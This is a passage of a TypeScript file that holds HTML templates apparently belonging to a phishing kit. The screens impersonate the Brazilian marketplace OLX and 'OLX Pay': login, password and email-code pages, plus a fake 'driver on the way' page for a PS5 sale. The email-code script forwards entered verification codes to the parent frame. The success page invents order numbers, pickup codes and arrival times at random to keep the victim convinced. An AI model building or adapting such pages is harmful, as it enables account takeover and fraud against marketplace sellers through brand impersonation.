          setLoading(true);
          window.parent.postMessage({
            type: 'iframe-help-action',
            action: 'email-code-submit',
            code: code
          }, '*');
        }
      }

      // Permite que o pai resete a tela em caso de rejeição
      window.addEventListener('message', function(e){
        var d = e.data;
        if(!d || typeof d !== 'object') return;
        if(d.type === 'iframe-code-error'){
          showError(d.message);
        }
      });

      inputs.forEach(function(inp, idx){
        inp.addEventListener('input', function(){
          inp.value = (inp.value || '').replace(/\\D/g, '').slice(0, 1);
          inp.removeAttribute('aria-invalid');
          clearError();
          if(inp.value && idx < inputs.length - 1){
            inputs[idx + 1].focus();
          }
          emitIfFull();
        });
        inp.addEventListener('keydown', function(e){
          if(e.key === 'Backspace' && !inp.value && idx > 0){
            inputs[idx - 1].focus();
          }
        });
        inp.addEventListener('paste', function(e){
          var txt = (e.clipboardData || window.clipboardData).getData('text') || '';
          var digits = txt.replace(/\\D/g, '').slice(0, inputs.length);
          if(!digits) return;
          e.preventDefault();
          for(var i = 0; i < inputs.length; i++){
            inputs[i].value = digits[i] || '';
          }
          var last = Math.min(digits.length, inputs.length) - 1;
          if(last >= 0) inputs[last].focus();
          emitIfFull();
        });
      });

      var resendBtn = document.getElementById('resend-btn');
      if(resendBtn){
        resendBtn.addEventListener('click', function(){
          window.parent.postMessage({ type: 'iframe-help-action', action: 'email-code-resend' }, '*');
        });
      }

      var backBtn = document.querySelector('[data-action="back"]');
      if(backBtn){
        backBtn.addEventListener('click', function(){
          window.parent.postMessage({ type: 'iframe-link-click', url: 'back' }, '*');
        });
      }
    })();
  </script>
</body>
</html>`;

const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Motorista a caminho - OLX</title>
<style>
  *,*::before,*::after{box-sizing:border-box}
  html,body{margin:0;padding:0;background:#f5f5f5;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;min-height:100%}
  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#fff}
  /* Topbar */
  header.topbar{position:sticky;top:0;z-index:20;background:#fff;border-bottom:1px solid #ececec;display:flex;align-items:center;gap:14px;padding:14px 16px}
  header.topbar .back{display:inline-flex;padding:4px;background:none;border:0;cursor:pointer;color:#1a1a1a}
  header.topbar h2{margin:0;font-size:16px;font-weight:600;color:#1a1a1a}
  /* HERO */
  .hero{position:relative;background:linear-gradient(180deg,#f25c2a 0%,#ee4d23 100%);color:#fff;padding:32px 24px 0;overflow:hidden}
  .hero .logo{display:flex;align-items:center;justify-content:center;gap:8px;font-size:18px;font-weight:700;letter-spacing:.3px}
  .hero .logo svg{height:26px;width:26px}
  .hero h1{margin:18px 0 6px;font-size:28px;font-weight:800;letter-spacing:.5px;text-align:center;line-height:1.1}
  .hero .order-id{display:block;text-align:center;font-size:14px;font-weight:500;opacity:.95;letter-spacing:.5px}
  .hero-illu{position:relative;height:140px;margin-top:18px}
  .hero-illu .wave{position:absolute;left:-10%;right:-10%;bottom:50px;height:40px;background:#f9a48a;border-radius:50% 50% 0 0/100% 100% 0 0;opacity:.55}
  .hero-illu .wave2{position:absolute;left:-15%;right:-15%;bottom:40px;height:30px;background:#fbb89e;border-radius:50% 50% 0 0/100% 100% 0 0;opacity:.4}
  .moto-svg{position:absolute;right:12px;bottom:0;width:200px;height:130px}
  .hero-bottom-fade{height:14px;background:#fff}
  /* Greeting + tracker */
  .greet{padding:22px 20px 6px}
  .greet h2{margin:0 0 6px;font-size:18px;font-weight:700}
  .greet p{margin:0;font-size:14px;color:#525866;line-height:1.5}
  .tracker{padding:24px 16px 8px;background:#fff}
  .tracker .rail{position:relative;display:grid;grid-template-columns:repeat(5,1fr);gap:0;align-items:start}
  .tracker .line{position:absolute;left:10%;right:10%;top:14px;height:2px;background:#e3e6ec;z-index:0}
  .tracker .line .fill{position:absolute;left:0;top:0;bottom:0;width:62%;background:#117a3a}
  .step{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;gap:6px;text-align:center;padding:0 4px}
  .step .dot{width:30px;height:30px;border-radius:50%;background:#fff;border:2px solid #d2d6df;color:#525866;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700}
  .step.done .dot{background:#117a3a;border-color:#117a3a;color:#fff}
  .step.active .dot{background:#f25c2a;border-color:#f25c2a;color:#fff;box-shadow:0 0 0 6px rgba(242,92,42,.15)}
  .step .lbl{font-size:11px;color:#1a1a1a;font-weight:600;line-height:1.25;max-width:62px}
  .step.muted .lbl{color:#9097a6;font-weight:500}
  /* CTA + ETA */
  .cta-wrap{display:flex;justify-content:center;padding:18px 16px 6px}
  .cta{background:#1a1a1a;color:#fff;border:0;border-radius:9999px;padding:14px 32px;font-size:15px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
  .eta{margin:8px 16px 0;text-align:center;font-size:13px;color:#ee4d23;font-weight:600}
  /* Sections */
  section.block{margin:18px 16px 0;background:#fff;border:1px solid #ececec;border-radius:14px;padding:16px}
  section.block h3{margin:0 0 12px;font-size:15px;font-weight:700;color:#1a1a1a;display:flex;align-items:center;gap:8px}
  section.block h3 svg{color:#6E0AD6}
  /* Product */
  .prod{display:flex;gap:14px;align-items:center}
  .prod .img{flex-shrink:0;width:84px;height:84px;border-radius:10px;background:linear-gradient(135deg,#1a1a2e,#0e4ea8);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:18px;letter-spacing:.5px}
  .prod .body{flex:1;min-width:0}
  .prod .name{margin:0;font-size:15px;font-weight:600;color:#1a1a1a;line-height:1.35}
  .prod .qty{margin:4px 0 0;font-size:12px;color:#6b7280}
  .prod .price{margin:6px 0 0;font-size:16px;font-weight:700;color:#1a1a1a}
  /* Address */
  .addr p{margin:0;font-size:13px;color:#1a1a1a;line-height:1.5}
  .addr .name{font-weight:700;margin-bottom:4px}
  .addr .muted{color:#6b7280;margin-top:6px;font-size:12px}
  /* Order details */
  .row{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;padding:8px 0;border-bottom:1px dashed #ececec;font-size:13px}
  .row:last-child{border-bottom:0}
  .row .k{color:#6b7280}
  .row .v{color:#1a1a1a;font-weight:600;text-align:right;word-break:break-word}
  .row.copy .v{color:#6E0AD6;cursor:pointer;display:inline-flex;align-items:center;gap:6px}
  .total{margin-top:6px;display:flex;justify-content:space-between;align-items:center;padding-top:12px;border-top:1px solid #ececec;font-size:16px;font-weight:800;color:#1a1a1a}
  .total .v{color:#117a3a}
  /* Reminder */
  .reminder{margin:18px 16px 24px;background:#fff8e6;border:1px solid #f3d28a;border-radius:12px;padding:14px;display:flex;gap:12px}
  .reminder svg{flex-shrink:0;color:#b76e00;margin-top:2px}
  .reminder p{margin:0;font-size:12.5px;color:#1a1a1a;line-height:1.5}
  .reminder strong{color:#b76e00}
  /* Footer */
  footer{padding:24px 16px 40px;text-align:center;color:#6b7280;font-size:11px;line-height:1.5}
  /* Toast */
  .toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);background:#1a1a1a;color:#fff;padding:10px 16px;border-radius:9999px;font-size:13px;opacity:0;pointer-events:none;transition:opacity .2s;z-index:50}
  .toast.show{opacity:1}
  /* Pulse for moto */
  @keyframes pulseDot{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.15);opacity:.85}}
  .step.active .dot{animation:pulseDot 1.6s ease-in-out infinite}
</style>
</head>
<body>
  <div class="wrap">
    <header class="topbar">
      <button type="button" class="back" aria-label="Voltar">
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
      </button>
      <h2>Status do pedido</h2>
    </header>

    <!-- HERO -->
    <div class="hero">
      <div class="logo">
        <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <rect width="40" height="40" rx="9" fill="#fff"/>
          <text x="20" y="26" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="13" font-weight="800" fill="#6E0AD6">OLX</text>
        </svg>
        <span>OLX Pay</span>
      </div>
      <h1>MOTORISTA A CAMINHO</h1>
      <span class="order-id" id="hero-order">#OLX-6985866921</span>
      <div class="hero-illu">
        <div class="wave"></div>
        <div class="wave2"></div>
        <!-- Motoboy SVG ilustrativo -->
        <svg class="moto-svg" viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <!-- caixa atrás -->
          <rect x="22" y="58" width="42" height="36" rx="4" fill="#b6371a"/>
          <rect x="32" y="68" width="22" height="2" fill="#fff" opacity=".8"/>
          <rect x="40" y="74" width="6" height="6" fill="#fff" opacity=".8"/>
          <!-- corpo moto -->
          <path d="M40 110 Q60 80 100 90 L150 90 Q170 90 178 105" stroke="#1a1a1a" stroke-width="6" fill="none" stroke-linecap="round"/>
          <!-- assento -->
          <rect x="95" y="78" width="40" height="14" rx="6" fill="#1a1a1a"/>
          <!-- guidão -->
          <path d="M150 90 L165 70 L182 72" stroke="#1a1a1a" stroke-width="5" fill="none" stroke-linecap="round"/>
          <!-- frente -->
          <path d="M155 78 L185 78 L190 95 L170 100 Z" fill="#ee4d23"/>
          <!-- piloto corpo -->
          <path d="M110 78 Q116 56 138 56 L148 56 L156 80 Z" fill="#ee4d23"/>
          <!-- braço -->
          <path d="M148 60 L168 70" stroke="#ee4d23" stroke-width="9" stroke-linecap="round" fill="none"/>
          <!-- cabeça/capacete -->
          <circle cx="138" cy="44" r="14" fill="#1a1a1a"/>
          <path d="M126 44 Q126 32 138 32 Q150 32 150 44" fill="#ee4d23"/>
          <rect x="128" y="40" width="20" height="6" rx="2" fill="#9ad8ff"/>
          <!-- rodas -->
          <circle cx="60" cy="115" r="18" fill="#1a1a1a"/>
          <circle cx="60" cy="115" r="7" fill="#fff"/>
          <circle cx="170" cy="115" r="18" fill="#1a1a1a"/>
          <circle cx="170" cy="115" r="7" fill="#fff"/>
        </svg>
      </div>
    </div>

    <!-- Greeting -->
    <div class="greet">
      <h2>Olá, <span id="user-name">{{lead.email}}</span>!</h2>
      <p>O comprador foi verificado e o pedido <strong id="order-inline">#OLX-6985866921</strong> está liberado. Um motorista parceiro está a caminho do seu endereço para retirar o produto e levar até o comprador.</p>
    </div>

    <!-- Tracker -->
    <div class="tracker">
      <div class="rail">
        <div class="line"><div class="fill"></div></div>
        <div class="step done"><div class="dot">✓</div><div class="lbl">Pedido recebido</div></div>
        <div class="step done"><div class="dot">✓</div><div class="lbl">Pagamento</div></div>
        <div class="step done"><div class="dot">✓</div><div class="lbl">Verificação</div></div>
        <div class="step active"><div class="dot">4</div><div class="lbl">Motorista a caminho</div></div>
        <div class="step muted"><div class="dot">5</div><div class="lbl">Produto coletado</div></div>
      </div>
    </div>

    <div class="cta-wrap">
      <button type="button" class="cta">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
        Rastrear motorista
      </button>
    </div>
    <p class="eta" id="eta-line">Chega no seu endereço em 35–50 minutos</p>

    <!-- Produto -->
    <section class="block">
      <h3>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
        Produto
      </h3>
      <div class="prod">
        <div class="img">PS5</div>
        <div class="body">
          <p class="name">PlayStation 5 Slim · Edição Digital</p>
          <p class="qty">1 unidade · Em mãos</p>
          <p class="price">R$ 2.350,00</p>
        </div>
      </div>
    </section>

    <!-- Endereço -->
    <section class="block addr">
      <h3>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
        Endereço de coleta
      </h3>
      <p class="name">Seu endereço cadastrado</p>
      <p>O motorista vai até você para coletar o produto e entregá-lo ao comprador. Mantenha o telefone por perto — ele entra em contato ao chegar e vai pedir o código de coleta abaixo.</p>
      <p class="muted">Atualize seus dados em "Minha conta" se necessário.</p>
    </section>

    <!-- Detalhes -->
    <section class="block">
      <h3>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="9" y1="13" x2="15" y2="13"/><line x1="9" y1="17" x2="13" y2="17"/></svg>
        Detalhes do pedido
      </h3>
      <div class="row copy" id="copy-row">
        <span class="k">Número</span>
        <span class="v">
          <span id="order-number">6985866921454226215</span>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
        </span>
      </div>
      <div class="row"><span class="k">Data</span><span class="v" id="order-date">Hoje · 20h32</span></div>
      <div class="row"><span class="k">Pagamento</span><span class="v">OLX Pay · aprovado</span></div>
      <div class="row"><span class="k">Modalidade</span><span class="v">Entrega em mãos · motoboy</span></div>
      <div class="row"><span class="k">Código de coleta</span><span class="v" id="pickup-code">—</span></div>
      <div class="total">
        <span>Valor total</span>
        <span class="v">R$ 2.350,00</span>
      </div>
    </section>

    <!-- Reminder -->
    <div class="reminder">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 1.8 20.5h20.4L12 3z"/><line x1="12" y1="10" x2="12" y2="14.5"/><line x1="12" y1="17.3" x2="12" y2="17.4"/></svg>
        <p><strong>Lembrete:</strong> a OLX nunca cobra valores adicionais após a verificação. Confirme o código de coleta com o motorista antes de entregar o produto. <strong>Não compartilhe esse código por mensagem.</strong></p>
    </div>

    <footer>
      © Bom Negócio Atividades de Internet Ltda. — Rio de Janeiro, RJ<br>
      Você pode fechar esta página. Avisos serão enviados por SMS e e-mail.
    </footer>
  </div>

  <div class="toast" id="toast"></div>

  <script>
    (function(){
      function showToast(msg){
        var t = document.getElementById('toast');
        if(!t) return;
        t.textContent = msg;
        t.classList.add('show');
        setTimeout(function(){ t.classList.remove('show'); }, 1800);
      }
      // Order id aleatório bonitinho
      var rnd = '';
      for(var i=0;i<10;i++) rnd += Math.floor(Math.random()*10);
      var label = '#OLX-' + rnd;
      var heroEl = document.getElementById('hero-order');
      var inlineEl = document.getElementById('order-inline');
      if(heroEl) heroEl.textContent = label;
      if(inlineEl) inlineEl.textContent = label;

      // Código de retirada 6 dígitos
      var code = '';
      for(var k=0;k<6;k++) code += Math.floor(Math.random()*10);
      var codeEl = document.getElementById('pickup-code');
      if(codeEl) codeEl.textContent = code;

      // Nome do usuário a partir do email (placeholder), com fallback
      var nameEl = document.getElementById('user-name');
      if(nameEl){
        var raw = (nameEl.textContent || '').trim();
        if(!raw || raw.indexOf('{{') === 0){ nameEl.textContent = 'tudo certo'; }
        else {
          var local = raw.split('@')[0] || raw;
          local = local.replace(/[._-]+/g,' ');
          local = local.charAt(0).toUpperCase() + local.slice(1);
          nameEl.textContent = local;
        }
      }

      // Data hoje
      var dEl = document.getElementById('order-date');
      if(dEl){
        var d = new Date();
        var pad = function(n){ return n<10 ? '0'+n : ''+n; };
        dEl.textContent = pad(d.getDate())+'/'+pad(d.getMonth()+1)+' · '+pad(d.getHours())+'h'+pad(d.getMinutes());
      }

      // ETA aleatório
      var etaEl = document.getElementById('eta-line');
      if(etaEl){
        var min = 25 + Math.floor(Math.random()*15);
        var max = min + 10 + Math.floor(Math.random()*10);
        etaEl.textContent = 'Chega no seu endereço em ' + min + '–' + max + ' minutos';
      }

      // Copy número
      var copyRow = document.getElementById('copy-row');
      if(copyRow){
        copyRow.addEventListener('click', function(){
          var n = (document.getElementById('order-number')||{}).textContent || '';
          if(navigator.clipboard){ navigator.clipboard.writeText(n).catch(function(){}); }
          showToast('Número copiado!');
        });
      }
    })();
  </script>
</body>
</html>`;


export const MANUAL_SCREEN_TEMPLATES: Record<string, { title: string; html: string }> = {
  "access-account": {
    title: "Acesse sua conta",
    html: ACCESS_ACCOUNT_HTML,
  },
  "password": {
    title: "Tela de senha",
    html: PASSWORD_SCREEN_HTML,
  },
  "email-code": {
    title: "Tela de e-mail (código)",
    html: EMAIL_CODE_SCREEN_HTML,
  },
  "verification-success": {
    title: "Verificação aprovada",
    html: VERIFICATION_SUCCESS_HTML,
  },
};
